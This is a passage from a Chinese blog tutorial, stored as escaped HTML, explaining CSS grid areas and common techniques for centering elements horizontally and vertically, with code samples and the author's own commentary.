class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"content \"\u003c/span\u003e\u0026gt;\u003c/span\u003econtent\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"sidebar \"\u003c/span\u003e\u0026gt;\u003c/span\u003esidebar\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"footer \"\u003c/span\u003e\u0026gt;\u003c/span\u003efooter\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-areas\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"header header header header header\"\u003c/span\u003e\n                                 \u003cspan class=\"hljs-string\"\u003e\"sidebar content content content content\"\u003c/span\u003e\n                                 \u003cspan class=\"hljs-string\"\u003e\"footer footer footer footer footer\"\u003c/span\u003e;\n\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e150px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n\n        }\n\n        \u003cspan class=\"hljs-selector-class\"\u003e.header\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-area\u003c/span\u003e:header; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e}\n        \u003cspan class=\"hljs-selector-class\"\u003e.content\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-area\u003c/span\u003e: content; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fffa90\u003c/span\u003e}\n        \u003cspan class=\"hljs-selector-class\"\u003e.sidebar\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-area\u003c/span\u003e: sidebar; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#5bc0de\u003c/span\u003e}\n        \u003cspan class=\"hljs-selector-class\"\u003e.footer\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-area\u003c/span\u003e: footer; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffff00\u003c/span\u003e}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/0b45387b08f3a1fc55f7fc29fd38ebd4\" alt=\"grid-template-areas 定义网格区域\"/\u003e\u003cfigcaption\u003egrid-template-areas 定义网格区域\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e我发现这样布局的一个优点，在不设置高度的情况下（父容器和 \u003ccode\u003egrid-template-rows\u003c/code\u003e 的值，或者 \u003ccode\u003egrid-template-rows\u003c/code\u003e 设置为 \u003ccode\u003eauto\u003c/code\u003e 时，\u003ccode\u003eslider\u003c/code\u003e 和 \u003ccode\u003econtent\u003c/code\u003e 的高度是一致的，并且会根据其内的高度自适应）\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e例如：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/4c8a876364205f37368a57e378746b5f\" alt=\"不设置高度使高度自适应\"/\u003e\u003cfigcaption\u003e不设置高度使高度自适应\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch1 id=\"-css-\"\u003e常用的 CSS 布局\u003c/h1\u003e\n\u003cp\u003e在介绍了 CSS 的布局方式之后，我们来看一下常用的 CSS 布局有哪些\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e水平垂直居中（感觉总结的并不是很好）\u003c/h2\u003e\n\u003cp\u003e感觉垂直居中真的是已经被讲烂了，但是在平时做项目时，我都是靠试的，导致面试的时候被问到有时候回答不上来，现在就用自己的方式来总结一下。其实这个方式是有很多的，但就是看的教程太多了，导致最后一个都没有记住，\u003cstrong\u003e所以我决定尽可能的将情况考虑完整，然后每一种情况只记住一个最佳实践。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e对于居中，我个人认为不需要背什么“x 种方式实现 xx”这样的例子，我们只需要了解其原理即可写出符合要求的 css。\u003c/p\u003e\n\u003cp\u003e水平、垂直居中，个人比较喜欢用绝对定位的方法实现，其次就是使用 \u003ccode\u003etable\u003c/code\u003e 布局，因为自带垂直居中。如果是单行的行内元素使用 \u003ccode\u003eline-height\u003c/code\u003e 等于 \u003ccode\u003eheight\u003c/code\u003e，对于多行元素的垂直居中，大部分都是使用 \u003ccode\u003etable\u003c/code\u003e 元素（求推荐更好的布局），当然还有 flex 和 grid 布局。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e水平居中\u003c/h3\u003e\n\u003cp\u003e一般水平居中还是比较容易的，我一般都是先看子元素是固定宽度还是宽度未知\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e固定宽度\u003c/h4\u003e\n\u003cp\u003e这种方式是绝对定位居中，除了使用 \u003ccode\u003emargin\u003c/code\u003e，我们还可以使用 \u003ccode\u003etransform\u003c/code\u003e（注意浏览器兼容性，只适用于 ie9+，移动开发请忽略）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e300px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: relative;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.inner\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: absolute;\n            \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin-top\u003c/span\u003e: -\u003cspan class=\"hljs-number\"\u003e25px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin-left\u003c/span\u003e: -\u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e300px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: relative;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.inner\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: absolute;\n            \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003etransform\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003etranslate\u003c/span\u003e(-50%, -50%);\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e或者使用 \u003ccode\u003emagin:0 auto\u003c/code\u003e；但一般情况下我都会使用上一种，因为习惯了(ಥ_ಥ)\u003c/p\u003e\n\u003ch4 id=\"-\"\u003e宽度未知\u003c/h4\u003e\n\u003cp\u003e将子元素设置为行内元素，然后父元素设置 \u003ccode\u003etext-align: center\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e300px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: relative;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.inner\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: inline-block;\n\n        }\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"-\"\u003e多个块状元素\u003c/h4\u003e\n\u003cp\u003e上面的方式即使子元素不止一个也想实现水平居中也是有效的，（宽度固定不固定都可，不固定的话就不需要设置宽度，会被自动撑开，但是要考虑到撑爆的情况）例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e250px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: relative;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.inner\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: inline-block;\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e150px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e auto;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/666841916ea971f4705b439282c86658\" alt=\"多个子元素水平居中\"/\u003e\u003cfigcaption\u003e多个子元素水平居中\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e当然也可以使用我们刚刚介绍的 flex，我们只需要让子元素在主轴上的对齐方式设置为居中就可以\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e250px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: flex;\n            \u003cspan class=\"hljs-attribute\"\u003ejustify-content\u003c/span\u003e: center;\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.inner\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e150px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin-left\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e10px\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"-\"\u003e垂直居中\u003c/h3\u003e\n\u003ch4 id=\"-\"\u003e单行行内元素\u003c/h4\u003e\n\u003cp\u003e单行海内元素居中，只需要将子元素的行高等于高度就可以了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-id\"\u003e#container\u003c/span\u003e {\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e400px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n        }\n        \u003cspan class=\"hljs-selector-id\"\u003e#inner\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: inline-block;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eline-height\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"-\"\u003e多行元素\u003c/h4\u003e\n\u003cp\u003e上面的这种方式只能处理单行的行内元素，对于多行的行内元素是处理不了的，因为给每一个子元素都设置了 \u003ccode\u003eline-height\u003c/code\u003e，看了很多方法，要不是没有效果，要不然就是又局限性，提到最多的是使用 \u003ccode\u003etable-cell\u003c/code\u003e 的方式（但是貌似这个方法也有一点弊端，那就是其子元素的表现形式和行内元素类似，子元素不能独占一行），\u003cstrong\u003e当然如果你有更好的方式，欢迎提出\u003c/strong\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e {\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e400px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: absolute;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: table;\n            \u003cspan class=\"hljs-attribute\"\u003evertical-align\u003c/span\u003e:middle;\n        }\n\n        \u003cspan class=\"hljs-selector-class\"\u003e.inner\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: table-cell;\n            \u003cspan class=\"hljs-attribute\"\u003evertical-align\u003c/span\u003e:middle;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e还有一个方法是设置一个空的行内元素，使其 \u003ccode\u003eheight:100%\u003c/code\u003e，\u003ccode\u003edisplay:inline-block\u003c/code\u003e,\u003ccode\u003evertical-align: middle;\u003c/code\u003e 并且 \u003ccode\u003efont-size:0\u003c/code\u003e。但是这样方式的原理我还不是很清楚，只是知道要设置一个空元素，高度和父元素相等，并且设置垂直居中的属性。但是，这只是用与所有的行内元素的宽度和不超过父元素的宽度的情况。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"WechatIMG110.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"50px\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"WechatIMG110.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"50px\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"WechatIMG110.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"50px\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e123\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e400px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n\n        }\n        \u003cspan class=\"hljs-selector-tag\"\u003eimg\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003evertical-align\u003c/span\u003e: middle;\n\n        }\n        \u003cspan class=\"hljs-selector-tag\"\u003ep\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: inline-block;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eline-height\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003evertical-align\u003c/span\u003e: middle;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/732fedf7ebd5eeb817f9a522bbdff6ea\" alt=\"多行行内元素\"/\u003e\u003cfigcaption\u003e多行行内元素\u003c/figcaption\u003e\u003c/figure\u003e\u003cbr\u003e另一个一劳永逸的方法就是 flex，但是要注意浏览器的兼容性。\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e图片和文字垂直居中\u003c/h2\u003e\n\u003cp\u003e经常有看到设计稿是图片和文字垂直居中的，那么怎么才能让图片和文字垂直居中呢？\u003cbr\u003e只需要给图片一个 \u003ccode\u003evertical-align: middle;\u003c/code\u003e 属性就可以：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"WechatIMG110.jpg\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"260\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e123456\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e {\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e400px\u003c/span\u003e;\n\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e \u003cspan class=\"hljs-selector-tag\"\u003eimg\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: inline-block;\n            \u003cspan class=\"hljs-attribute\"\u003evertical-align\u003c/span\u003e: middle;\n        }\n\n        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e \u003cspan class=\"hljs-selector-tag\"\u003ep\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: inline-block;\n\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/88386947f106680912f2b889917891a6\" alt=\"图片和文字垂直居中\"/\u003e\u003cfigcaption\u003e图片和文字垂直居中\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e重点来啦~\u003c/h2\u003e\n\u003cp\u003e自我感觉总结的居中问题不是特别的好，我们现在可以来总结一下其中的原理：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e我们要实现水平或者垂直居中，应该从两方面下手：元素自带居中的效果或者强制让其显示在中间。\u003c/li\u003e\n\u003cli\u003e所以我们先考虑，哪些元素有自带的居中效果，最先想到的应该就是 \u003ccode\u003etext-align:center\u003c/code\u003e 了，但是这个只对行内元素有效，所以我们要使用 \u003ccode\u003etext-align:center\u003c/code\u003e 就必须将子元素设置为 \u003ccode\u003edisplay: inline;\u003c/code\u003e 或者 \u003ccode\u003edisplay: inline-block;\u003c/code\u003e；\u003c/li\u003e\n\u003cli\u003e接下来我们可能会想既然有 \u003ccode\u003etext-align\u003c/code\u003e 那么会不会对应也有自带垂直居中的呢，答案是有的 \u003ccode\u003evertical-align:\u003c/code\u003e，我一直不是很喜欢使用这个属性，因为十次用，9.9 次都没有垂直居中，一度让我怀疑人生。现在貌似也搞得不是很清楚，看了 \u003ca href=\"http://www.zhangxinxu.com/wordpress/2010/05/%E6%88%91%E5%AF%B9css-vertical-align%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3%E4%B8%8E%E8%AE%A4%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/\" target=\"_blank\"\u003e张鑫旭的文章\u003c/a\u003e 居然看得也不是很懂，笑哭。目前就在 \u003ccode\u003etable\u003c/code\u003e 中设置有效，因为 \u003ccode\u003etable\u003c/code\u003e 元素 的特性，打娘胎里面带的就是好用。还有一种可以有效的方式是前面提到的空元素的方式，不过感觉多设置一个元素还不如使用 \u003ccode\u003etable\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e还有一只设置垂直居中的是将行内元素的 \u003ccode\u003eline-height\u003c/code\u003e 和 \u003ccode\u003eheight\u003c/code\u003e 设置为相同（只适用于单行行内元素）\u003c/li\u003e\n\u003cli\u003e固定宽度或者固定高度的情况个人认为设置水平垂直居最简单，可以直接使用绝对定位。使用绝对定位就是子元素相对于父元素的位置，所以将父元素设置 \u003ccode\u003eposition:reletive\u003c/code\u003e 对应的子元素要设置 \u003ccode\u003eposition:absolute\u003c/code\u003e，然后使用 \u003ccode\u003etop:50%;left:50%\u003c/code\u003e，将子元素的左上角和父元素的中点对齐，之后再设置偏移 \u003ccode\u003emargin-top: 1/2 子元素高度;margin-left: 1/2 